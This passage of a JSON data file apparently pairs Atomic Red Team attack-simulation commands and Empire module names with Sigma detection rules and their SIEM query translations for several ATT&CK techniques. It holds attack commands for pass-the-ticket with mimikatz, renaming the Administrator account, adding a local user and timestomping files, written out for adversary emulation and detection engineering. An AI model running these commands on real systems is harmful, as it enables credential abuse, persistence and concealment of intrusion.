\"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'NTFS Alternate Data Stream\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "\\\\*.keyword:(*set\\\\-content* AND *\\\\-stream*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(\"set-content\" \"-stream\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(\"set-content\" \"-stream\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*set-content)(?=.*-stream))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Run PowerShell script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: experimental\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/master/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019/10/30\ntags:\n    - attack.defense_evasion\n    - attack.t1096\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\powershell.exe'\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all: \n          - 'Get-Content'\n          - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Run PowerShell script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: experimental\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/master/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019/10/30\ntags:\n    - attack.defense_evasion\n    - attack.t1096\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\powershell.exe'\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all: \n          - 'Get-Content'\n          - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\powershell.exe AND Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\-Content* AND CommandLine.keyword:*\\\\-Stream*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Run-PowerShell-script-from-ADS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Run PowerShell script from ADS\",\\n    \"description\": \"Detects PowerShell script execution from Alternate Data Stream (ADS)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1096\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\\\\\-Content* AND CommandLine.keyword:*\\\\\\\\-Stream*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\\\\\-Content* AND CommandLine.keyword:*\\\\\\\\-Stream*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Run PowerShell script from ADS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\powershell.exe AND Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\-Content* AND CommandLine.keyword:*\\\\-Stream*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\powershell.exe\" Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Get-Content*\" CommandLine=\"*-Stream*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\powershell.exe\" Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Get-Content*\" CommandLine=\"*-Stream*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*.*\\\\powershell\\\\.exe)(?=.*.*Get-Content.*)(?=.*.*-Stream.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1097/T1097.yaml", "command": "mimikatz # kerberos::ptt #{user_name}@atomic.local\n", "name": null}, {"source": "atomics/T1097/T1097.yaml", "command": "mimikatz # kerberos::ptt Administrator@atomic.local\n", "name": null}], "command_list": ["mimikatz # kerberos::ptt #{user_name}@atomic.local\n", "mimikatz # kerberos::ptt Administrator@atomic.local\n"], "technique_id": "T1097", "parsed_datasets": [{"Atomic Red Team Test - Pass the Ticket": {"display_name": "Pass the Ticket", "atomic_tests": [{"description": "Similar to PTH, but attacking Kerberos\n", "supported_platforms": ["windows"], "name": "Mimikatz Kerberos Ticket Attack", "input_arguments": {"domain": {"default": "atomic.local", "type": "string", "description": "domain"}, "user_name": {"default": "Administrator", "type": "string", "description": "username"}}, "executor": {"command": "mimikatz # kerberos::ptt #{user_name}@#{domain}\n", "name": "command_prompt"}}], "attack_technique": "T1097"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1098/T1098.yaml", "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/honeyhash", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/honeyhash", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/set_ad_object", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/set_ad_object", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully.", "name": "Dos"}], "command_list": ["$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n", "powershell/management/honeyhash", "powershell/management/honeyhash", "powershell/situational_awareness/network/powerview/set_ad_object", "powershell/situational_awareness/network/powerview/set_ad_object", "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully."], "technique_id": "T1098", "parsed_datasets": [{"Atomic Red Team Test - Account Manipulation": {"display_name": "Account Manipulation", "atomic_tests": [{"description": "Manipulate Admin Account Name\n", "supported_platforms": ["windows"], "name": "Admin Account Manipulate", "executor": {"elevation_required": true, "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n", "name": "powershell"}}], "attack_technique": "T1098"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1098", "Empire Module": "powershell/management/honeyhash", "Technique": "Account Manipulation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/honeyhash\":  [\"T1098\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1098", "Empire Module": "powershell/situational_awareness/network/powerview/set_ad_object", "Technique": "Account Manipulation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/set_ad_object\":  [\"T1098\"],"}}], "queries": [{"query": "title: Active Directory User Backdoors\nid: 300bac00-e041-4ee2-9c36-e262656a6ecc\ndescription: Detects scenarios where one can control another users or computers account without having to use their credentials.\nreferences:\n    - https://msdn.microsoft.com/en-us/library/cc220234.aspx\n    - https://adsecurity.org/?p=3466\n    - https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/\nauthor: '@neu5ron'\ntags:\n    - attack.t1098\n    - attack.credential_access\n    - attack.persistence\nlogsource:\n    product: windows\n    service: security\n    definition1: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\n    definition2: 'Requirements: Audit Policy : DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes'\ndetection:\n    selection1:\n        EventID: 4738\n    filter1:\n        AllowedToDelegateTo: null\n    filter2:\n        AllowedToDelegateTo: '-'\n    selection2:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToDelegateTo'\n    selection3:\n        EventID: 5136\n        ObjectClass: 'user'\n        AttributeLDAPDisplayName: 'servicePrincipalName'\n    selection4:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'        \n    condition: (selection1 and not 1 of filter*) or selection2 or selection3 or selection4\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Active Directory User Backdoors\nid: 300bac00-e041-4ee2-9c36-e262656a6ecc\ndescription: Detects scenarios where one can control another users or computers account without having to use their credentials.\nreferences:\n    - https://msdn.microsoft.com/en-us/library/cc220234.aspx\n    - https://adsecurity.org/?p=3466\n    - https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/\nauthor: '@neu5ron'\ntags:\n    - attack.t1098\n    - attack.credential_access\n    - attack.persistence\nlogsource:\n    product: windows\n    service: security\n    definition1: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\n    definition2: 'Requirements: Audit Policy : DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes'\ndetection:\n    selection1:\n        EventID: 4738\n    filter1:\n        AllowedToDelegateTo: null\n    filter2:\n        AllowedToDelegateTo: '-'\n    selection2:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToDelegateTo'\n    selection3:\n        EventID: 5136\n        ObjectClass: 'user'\n        AttributeLDAPDisplayName: 'servicePrincipalName'\n    selection4:\n        EventID: 5136\n        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'        \n    condition: (selection1 and not 1 of filter*) or selection2 or selection3 or selection4\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((((EventID:\"4738\" AND (NOT ((NOT _exists_:AllowedToDelegateTo) OR (AllowedToDelegateTo:\"\\\\-\")))) OR (EventID:\"5136\" AND AttributeLDAPDisplayName:\"msDS\\\\-AllowedToDelegateTo\")) OR (EventID:\"5136\" AND ObjectClass:\"user\" AND AttributeLDAPDisplayName:\"servicePrincipalName\")) OR (EventID:\"5136\" AND AttributeLDAPDisplayName:\"msDS\\\\-AllowedToActOnBehalfOfOtherIdentity\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Active-Directory-User-Backdoors <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Active Directory User Backdoors\",\\n    \"description\": \"Detects scenarios where one can control another users or computers account without having to use their credentials.\",\\n    \"tags\": [\\n      \"attack.t1098\",\\n      \"attack.credential_access\",\\n      \"attack.persistence\"\\n    ],\\n    \"query\": \"((((EventID:\\\\\"4738\\\\\" AND (NOT ((NOT _exists_:AllowedToDelegateTo) OR (AllowedToDelegateTo:\\\\\"\\\\\\\\-\\\\\")))) OR (EventID:\\\\\"5136\\\\\" AND AttributeLDAPDisplayName:\\\\\"msDS\\\\\\\\-AllowedToDelegateTo\\\\\")) OR (EventID:\\\\\"5136\\\\\" AND ObjectClass:\\\\\"user\\\\\" AND AttributeLDAPDisplayName:\\\\\"servicePrincipalName\\\\\")) OR (EventID:\\\\\"5136\\\\\" AND AttributeLDAPDisplayName:\\\\\"msDS\\\\\\\\-AllowedToActOnBehalfOfOtherIdentity\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((((EventID:\\\\\"4738\\\\\" AND (NOT ((NOT _exists_:AllowedToDelegateTo) OR (AllowedToDelegateTo:\\\\\"\\\\\\\\-\\\\\")))) OR (EventID:\\\\\"5136\\\\\" AND AttributeLDAPDisplayName:\\\\\"msDS\\\\\\\\-AllowedToDelegateTo\\\\\")) OR (EventID:\\\\\"5136\\\\\" AND ObjectClass:\\\\\"user\\\\\" AND AttributeLDAPDisplayName:\\\\\"servicePrincipalName\\\\\")) OR (EventID:\\\\\"5136\\\\\" AND AttributeLDAPDisplayName:\\\\\"msDS\\\\\\\\-AllowedToActOnBehalfOfOtherIdentity\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Active Directory User Backdoors\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((((EventID:\"4738\" AND (NOT ((NOT _exists_:AllowedToDelegateTo) OR (AllowedToDelegateTo:\"\\\\-\")))) OR (EventID:\"5136\" AND AttributeLDAPDisplayName:\"msDS\\\\-AllowedToDelegateTo\")) OR (EventID:\"5136\" AND ObjectClass:\"user\" AND AttributeLDAPDisplayName:\"servicePrincipalName\")) OR (EventID:\"5136\" AND AttributeLDAPDisplayName:\"msDS\\\\-AllowedToActOnBehalfOfOtherIdentity\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((((EventID=\"4738\" NOT ((NOT AllowedToDelegateTo=\"*\") OR (AllowedToDelegateTo=\"-\"))) OR (EventID=\"5136\" AttributeLDAPDisplayName=\"msDS-AllowedToDelegateTo\")) OR (EventID=\"5136\" ObjectClass=\"user\" AttributeLDAPDisplayName=\"servicePrincipalName\")) OR (EventID=\"5136\" AttributeLDAPDisplayName=\"msDS-AllowedToActOnBehalfOfOtherIdentity\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" ((((event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4738\"  -((-AllowedToDelegateTo=*) OR (AllowedToDelegateTo=\"-\"))) OR (event_id=\"5136\" AttributeLDAPDisplayName=\"msDS-AllowedToDelegateTo\")) OR (event_id=\"5136\" ObjectClass=\"user\" AttributeLDAPDisplayName=\"servicePrincipalName\")) OR (event_id=\"5136\" AttributeLDAPDisplayName=\"msDS-AllowedToActOnBehalfOfOtherIdentity\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?:.*(?=.*4738)(?=.*(?!.*(?:.*(?:.*(?:.*(?=.*(?!AllowedToDelegateTo)))|.*(?:.*(?=.*-)))))))|.*(?:.*(?=.*5136)(?=.*msDS-AllowedToDelegateTo))))|.*(?:.*(?=.*5136)(?=.*user)(?=.*servicePrincipalName))))|.*(?:.*(?=.*5136)(?=.*msDS-AllowedToActOnBehalfOfOtherIdentity))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Password Change on Directory Service Restore Mode (DSRM) Account\nid: 53ad8e36-f573-46bf-97e4-15ba5bf4bb51\nstatus: stable\ndescription: The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.\nreferences:\n    - https://adsecurity.org/?p=1714\nauthor: Thomas Patzke\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1098\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4794\n    condition: selection\nfalsepositives:\n    - Initial installation of a domain controller\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Password Change on Directory Service Restore Mode (DSRM) Account\nid: 53ad8e36-f573-46bf-97e4-15ba5bf4bb51\nstatus: stable\ndescription: The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.\nreferences:\n    - https://adsecurity.org/?p=1714\nauthor: Thomas Patzke\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1098\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4794\n    condition: selection\nfalsepositives:\n    - Initial installation of a domain controller\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "EventID:\"4794\"", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Password-Change-on-Directory-Service-Restore-Mode-DSRM-Account <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Password Change on Directory Service Restore Mode (DSRM) Account\",\\n    \"description\": \"The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1098\"\\n    ],\\n    \"query\": \"EventID:\\\\\"4794\\\\\"\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"EventID:\\\\\"4794\\\\\"\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Password Change on Directory Service Restore Mode (DSRM) Account\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "EventID:\"4794\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "EventID=\"4794\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4794\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^4794'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows local account manipulation\ndescription: win7 test\nreferences:\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net1.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4656 # has been requested to handle objects\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ObjectServer: 'Security Account Manager' # Object> Object Server\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: 'SAM_DOMAIN' # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ lsass.exe' # process> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: 'CreateUser'\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4728 # has enabled global security group to add a member.\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4720 # user account has been created.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SecurityID: '*' # new account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # new account> account name\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4722 #-enabled user accounts.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4738 # Changed user account.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 20s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1099/T1099.yaml", "command": "touch -a -t 197001010000.00 /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -m -t 197001010000.00 /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch /opt/filename\ndate -s \"$NOW\"\nstat /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -acmr /bin/sh {target_file_path}\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -acmr /bin/sh {target_file_path}\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.CreationTime = #{target_date_time} }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.CreationTime = 1970-01-01 00:00:00 }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastWriteTime = #{target_date_time} }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastWriteTime = 1970-01-01 00:00:00 }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastAccessTime = #{target_date_time} }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "powershell.exe Get-ChildItem C:\\Some\\file.txt | % { $_.LastAccessTime = 1970-01-01 00:00:00 }\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/timestomp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/timestomp", "name": "Empire Module Command"}], "command_list": ["touch -a -t 197001010000.00 /opt/filename\n", "touch -m -t 197001010000.00 /opt/filename\n", "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch /opt/filename\ndate -s \"$NOW\"\nstat /opt/filename\n", "touch -acmr /bin/sh {target_file_path}\n", "touch -acmr /bin/sh {target_file_path}\n", "powershell.exe Get-ChildItem 